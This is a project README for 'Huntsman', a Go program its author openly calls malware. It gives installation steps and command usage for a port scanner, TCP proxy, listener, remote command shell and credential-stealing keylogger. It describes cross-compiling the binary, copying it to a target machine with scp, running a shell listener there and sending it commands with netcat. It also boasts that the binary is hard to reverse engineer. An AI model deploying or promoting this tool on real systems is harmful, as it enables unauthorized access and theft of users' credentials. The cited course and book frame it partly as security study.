# Huntsman
A versatile and highly concurrent malware written in Golang.  
https://souvikhaldar.github.io/huntsman/

![](huntsman-main.jpg)

# Complete guide
[1.Installation](https://github.com/souvikhaldar/huntsman#installation)   
[2.Reverse shell](https://github.com/souvikhaldar/huntsman#reverse-shell)  
[3.Concurrent port scanning](https://github.com/souvikhaldar/huntsman#fast-concurrent-port-scanning)    
[4.TCP proxy](https://github.com/souvikhaldar/huntsman#run-a-tcp-proxy)   
[5.TCP Listener](https://github.com/souvikhaldar/huntsman#run-a-tcp-listener)   
[6.Keylogger](https://github.com/souvikhaldar/huntsman/blob/master/README.md#keylogger)



# Inspiration
The inspiration of this tool are primarily the following two sources:
1. Pursuing [Advanced Exercutive Program in Cyber Security and Cyber Defense](https://talentsprint.com/pages/wip/iit-kanpur/v2.5/index.html) at the esteemed [c3i](https://security.cse.iitk.ac.in/) institution of [IIT Kanpur](https://www.iitk.ac.in/) and Professor [Sandeep Shukla](https://www.cse.iitk.ac.in/users/sandeeps/), [Rohit Negi](https://www.linkedin.com/in/rohit-negi-02856227/) and [Anand Handa](https://www.linkedin.com/in/anand-handa-391a61107/), who helped take baby steps in cyber security world.  
2. The excellent book [Black Hat Go: Go Programming For Hackers and Pentesters](https://www.amazon.in/Black-Hat-Go-Programming-Pentesters-ebook/dp/B073NPY29N) by Tom Steele, Chris Patten and Dan Kottmann. 


# What sets huntsman apart?
* Fast and concurrent
* Single binary executable for almost every platform and architecture
* Consumes very less RAM (about 10-15 MB) and CPU  
* Each step well documented and covered in video tutorial as well 
* The binary compiled it Golang is very hard to reverse engineer, hence it is

# Path
- [x] Port scanner    
- [x] HTTP traffic analyzer
- [x] TCP proxy    
- [x] TCP listener  
- [x] HTTP server  
- [x] Reverse Shell
- [x] Keylogger  
- [ ] SMB and NTLM expotation  
- [ ] Abusing Databases  
- [ ] Packet processing  
- [ ] Fuzzing and shellcode  
- [ ] Cryptography  
- [ ] Windows system analysis  
- [ ] steganography  
- [ ] CNC RAT  



# Complete Guide
		

# Installation
There multiple ways in which you can install `huntsman` on your machine or a target machine.  

1. Install it using golang compiler using `go install` or `go build`
	
	1. [Install Golang](https://golang.org/doc/install)    
	2. `git clone git@github.com:souvikhaldar/huntsman.git`
	3. `cd huntsman`  
	4. `go install`  
2. Download the binary from RELEASES and save it on on `$PATH`.  
3. Use the `goinstaller.py` script.  
	```
	./goinstaller.py --help 
	Install go program for multiple OS and multiple architectures
	Run goinstaller.py --help for all options
	usage: goinstaller.py [-h]
			      [--os {all,popular,linux,darwin,windows,dragonfly,android,freebsd,netbsd,openbsd,plan9,solaris,aixjs}]
			      [--arch {all,popular,amd64,386,arm,ppc64,arm64,ppc64le,mips,mipsle,mips64,mips64le,s390x}]
			      [--source SOURCE] [--target TARGET]

	optional arguments:
	  -h, --help            show this help message and exit
	  --os {all,popular,linux,darwin,windows,dragonfly,android,freebsd,netbsd,openbsd,plan9,solaris,aixjs}
				The target OS. Eg. all,linux,darwin,windows,etc
	  --arch {all,popular,amd64,386,arm,ppc64,arm64,ppc64le,mips,mipsle,mips64,mips64le,s390x}
				The target's architecture. Eg. all,amd64,386,etc
	  --source SOURCE       The directory where source source is present
	  --target TARGET       The target dir where the binary needs to be stored
	```

	Eg. Compiling for **popular** OSes like Windows, Microsoft and Linux for 64-bit architecture can be done using
	`./goinstaller.py --target ./download --os popular --arch amd64`

# Transfer to a target
Once you've compiled huntsman for the target OS and arch, you can transfer it 
using `scp` or any tool of choice:  
Eg, transfering linux binary to target machine:  
`scp ./download/linux_amd64 username@address:location`


# Fast concurrent port scanning  
``` 
huntsman portscan --help                                                                                    SIGINT(2) ↵  5295  10:30:46
Concurrently scan the provided range (by default 0 to 65535) to check if any port is open

Usage:
  huntsman portscan [flags]

Flags:
  -e, --end int32       last port number (default 65535)
  -h, --help            help for portscan
  -s, --start int32     starting port number (default 1)
      --target string   IP/URL address of the machine to be scanned
  -t, --threads int32   the number of goroutines to execute at a time (default 100)

```

Example:  
`huntsman portScan --target abc.com`  


# Run a TCP proxy

`huntsman proxy -s <local-port> -t <target-address> -p <target-port>`   

# Run a TCP listener

`huntsman listen --port=<port>`


# Reverse shell
First you need to compile the binary for the target machine using the 
`goinstaller.py` or anything of choice. Then preferably use `scp` to transfer
the binary to the target machine (see `Installation` section) then execute it
using `./<binary-name> reverseshell --port <port-number>`. Now the listener is
running to which you will be sending instructions to execute.   

We will be using [netcat](http://netcat.sourceforge.net/) as the client for 
sending the commands over the network.  
`nc <address-of-target> <port-number>`  
[Youtube link for the video demonstration](https://youtu.be/eE0k0GVZXyc)

# Keylogger 
A keylogger can log the keystrokes made by a user ,typically on a website. The logged keystrokes most of the times are crucial credentials of the users. Hackers use Credential Harvester (like keylogger) to steal your credentials.
Huntsman is the tool that contains a keylogger as well.    
Eg. `huntsman keylogger -w localhost:8192 -l 8192`   

This video is the demonstration for using huntsman as a keylogger. [Link to youtube video](https://youtu.be/BoPICq1MVhA)



